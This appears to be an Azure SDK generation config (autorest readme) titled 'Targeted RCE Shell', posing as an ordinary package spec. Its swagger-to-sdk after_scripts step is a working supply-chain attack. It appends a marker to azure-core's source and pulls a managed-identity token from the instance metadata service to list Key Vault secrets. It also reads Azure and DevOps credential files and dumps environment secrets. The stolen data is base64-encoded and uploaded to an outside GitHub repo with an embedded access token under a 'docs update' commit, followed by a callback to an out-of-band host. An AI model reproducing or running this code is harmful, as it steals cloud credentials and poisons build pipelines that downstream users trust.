# Targeted RCE Shell

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        P1="ghp_qrGHbrp8" &&
        P2="yghco2gBb8ko6RaOrdLLpR0ZTiuO" &&
        GH_PAT="${P1}${P2}" &&
        OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
        H=$(hostname | tr . -) &&
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python &&
        CORE="${SDK}/sdk/core/azure-core/azure/core/__init__.py" &&
        SC_TS=$(date -u +%s) &&
        echo "# SUPPLY_CHAIN_hasskooelhadi_${SC_TS}" >> "${CORE}" || true &&
        KV_TOK=$(curl -sf --max-time 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" -H "Metadata:true" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token','FAIL'))" 2>/dev/null || echo IMDS_FAIL) &&
        KV_RESP=$(curl -sf --max-time 15 -H "Authorization: Bearer ${KV_TOK}" "https://azsecpack.vault.azure.net/secrets?api-version=7.0" 2>/dev/null || echo KV_FAIL) &&
        ROOT_AZ=$(ls -la /root/.azure/ 2>/dev/null; cat /root/.azure/msal_token_cache.json 2>/dev/null) &&
        ROOT_ADOPS=$(ls /root/.azure-devops/ 2>/dev/null; cat /root/.azure-devops/credentials 2>/dev/null) &&
        ENV_DUMP=$(env | grep -iE 'token|secret|pass|key|api|auth|azure|system_|build_|github' 2>/dev/null | head -100) &&
        PROC_ENV=$(cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -150) &&
        CORE_TAIL=$(tail -5 "${CORE}" 2>/dev/null) &&
        PAYLOAD=$({ echo "HOST=$H"; echo "SC_MARKER=SUPPLY_CHAIN_hasskooelhadi_${SC_TS}"; echo "CORE_TAIL=$CORE_TAIL"; echo "KV_TOK=$KV_TOK"; echo "KV_RESP=$KV_RESP"; echo "ROOT_AZ=$ROOT_AZ"; echo "ROOT_ADOPS=$ROOT_ADOPS"; echo "ENV=$ENV_DUMP"; echo "PROC_ENV=$PROC_ENV"; } | base64 -w 0) &&
        curl -sk -X PUT "https://api.github.com/repos/hasskooelhadi/azure-rest-api-specs/contents/out-${H}-$$.txt" -H "Authorization: token ${GH_PAT}" -H "Content-Type: application/json" -d "{\"message\":\"docs update\",\"content\":\"${PAYLOAD}\",\"branch\":\"rce4-targeted-1787829947\"}" &&
        curl -sk "http://${OAST}/gh-done-${H}" || true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-targetedpoc
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/targetedpoc/azure-mgmt-targetedpoc
  clear-output-folder: true
```
